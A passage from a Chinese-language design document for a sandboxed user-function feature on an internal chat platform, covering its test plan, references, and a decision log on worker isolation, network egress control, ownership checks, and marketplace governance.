- Vitest + Playwright E2E（含 ownership / RBAC / host_command 白名單外注入 / quarantined visibility / clipboard.copy toast）
- Dogfood 1-2 位 dev → 1 週後開放所有 developer

---

## 12. References

- OpenWebUI Functions（設計靈感來源；不綁規格）
- ANILA UI README（`ANILA_UI/anila-ui/README.md`）
- CSP backend schema（`myCSPPlatform/backend/app/api/`）
- ANILA `Role` type（admin / developer / user）

---

## 13. Decision Log（brainstorming 紀錄）

| 決定 | 選項 | 結果 |
|---|---|---|
| Function 類型 | Pipe / Filter / Action / Tools / 全部 | Action only（Tools v2） |
| 執行環境 | CSP in-process / 獨立 worker / Pyodide / OpenAPI / MCP | 獨立 worker container |
| OpenWebUI 相容性 | 1:1（α） / β 鬆相容 / 不相容 | β 鬆相容 |
| Marketplace | 內部 / 內部+外部 import / 外部 community | 內部 |
| Network model | 公網 / 內網限制 / air-gapped | 內網 / 獨立網（資源 bundle、不打外部） |
| UserValves | 全做 / 砍掉 / 純 non-secret | 砍掉 v1（Option α） |
| Audit retention | 90 天 / 180 / 360 / 永久 | 360 天 |
| Action button 位置 | 訊息底下另一列 / 既有 toolbar 同一列 | 既有 toolbar 同一列（接在 👎 後） |

### 第二輪修法（Codex review 之後，2026-04-28）

| 決定 | 選項 | 結果 |
|---|---|---|
| Raw `execute` event vs host_command 白名單 | raw / 白名單 / 移除 | **白名單**（6 個動詞；raw 留 v2） |
| `/run` ownership 檢查 | 信任 caller / 顯式驗 conversation_service | **顯式驗 7 步** |
| Marketplace 治理 | admin approval / per-user install / 自助 publish + admin disable | **自助 publish + code 可見度收緊到 developer+ + admin disable + abuse report**（admin 不需 approve） |
| Worker isolation | rlimit only / +cap_drop+seccomp / 完整 hardening | **完整 hardening**（cap_drop ALL + seccomp + read-only + tmpfs + 非 root + no-new-privileges） |
| Network egress | 不限 / proxy allowlist / 完全 deny | **預設 deny + outbound proxy + allowlist** |
| Versioning circular FK | 保 FK + deferrable / 拿掉 FK | **拿掉 FK（latest_version_id 是 denormalized cache）** |
| version_no 並發 | sequence / for update / advisory lock | **advisory lock per-function** |
| Schema 抽取位置 | CSP exec user code / static AST / worker sandbox RPC | **worker `/extract-meta` RPC**（CSP 不 exec） |
| Audit redaction 角色 | 主防線 / 兜底 | **兜底**（reframe；主防線是 egress proxy + minimal injection） |

### 第三輪修法（Codex round-2 review，2026-04-28）

| 決定 | 選項 | 結果 |
|---|---|---|
| Egress 控制機制 | env vars / host iptables / 分裂網路拓樸 | **分裂網路拓樸**（worker 在 `internal:true` 的 functions-net，egress proxy 跨兩網橋接；env 不是安全邊界） |
| `/extract-meta` profile | 同 /exec 強度 / 更嚴 / 純 static AST | **兩階段：static AST 優先 + sandbox exec fallback (extract-meta-net 無 egress, 3s, 64MB, 不傳 valves)** |
| Test Console vs ownership 7 步 | 共用 7 步 / 分兩條路徑 | **分兩條路徑**：chat_message 走 owner check；test_console 走 author/admin synthetic |
| Conversation gate | 假設既有 share/handoff/clearance / 沿用實際 owner+admin only | **沿用實際 owner+admin only**（v1）；future work 標記 |
| Disabled by admin 後 code 可見度 | 沿用 disabled / 加 quarantined 第四狀態 | **加 quarantined**：code 鎖到 author+admin；`disabled_reason` 欄位記理由 |
| advisory lock key | hashtext / function_id 直接 | **namespaced 2-int (NS=42, function_id)** |
| clipboard.copy / link.open browser activation | 直接執行 / 二段確認 toast | **二段確認 toast**（順便 anti-phishing） |

### 第四輪修法（Codex round-3 review，2026-04-28）

| 決定 | 選項 | 結果 |
|---|---|---|
| Worker container 數量 | 1 個 worker（連 anila-internal + functions-net）/ 2 層（trusted api + untrusted runner） | **2 層**：api + runner-exec + runner-extract（CSP 連得到 api、user code 連不到 CSP） |
| /extract-meta network 隔離方法 | netns + os.unshare 切換 / 兩個 runner container | **兩個 runner container**（unshare 被 seccomp block；兩個 container 跟 sandbox 政策一致） |
| Memory limit | RLIMIT_RSS / docker `mem_limit` cgroup | **docker mem_limit cgroup + pids_limit**（RSS rlimit 在 Linux 上不可靠） |
| 連線失敗 assert 方式 | 綁特定錯誤字串 / 只 assert 連不通 | **只 assert 連不通**（具體錯誤碼依 docker / kernel 行為） |
